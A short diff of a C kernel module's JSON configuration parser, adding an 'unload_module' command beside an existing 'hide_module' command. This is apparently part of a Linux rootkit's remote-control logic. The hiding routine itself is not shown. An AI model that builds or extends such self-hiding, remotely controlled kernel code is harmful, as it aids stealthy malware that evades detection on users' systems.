@@ -136,7 +136,14 @@ static int parse_json(char *json_str)
 	DEBUG_PRINT("received new configuration");
 	/* Loop over all keys of the root object */
 	for (i=1 ; i<r ; i++)
-		if (!jsoneq(json_str, &t[i], "hide_module")) {
+		if (!jsoneq(json_str, &t[i], "unload_module")) {
+			if ((flag = extract_boolean_value(json_str)) == -1)
+				continue;
+			printk(KERN_INFO "%s: %s\n", "unload_module", (flag) ? "true" : "false");
+			if (flag)
+				unload_module();
+
+		} else if (!jsoneq(json_str, &t[i], "hide_module")) {
 			if ((flag = extract_boolean_value(json_str)) == -1)
 				continue;
 			printk(KERN_INFO "%s: %s\n", "hide_module", (flag) ? "true" : "false");
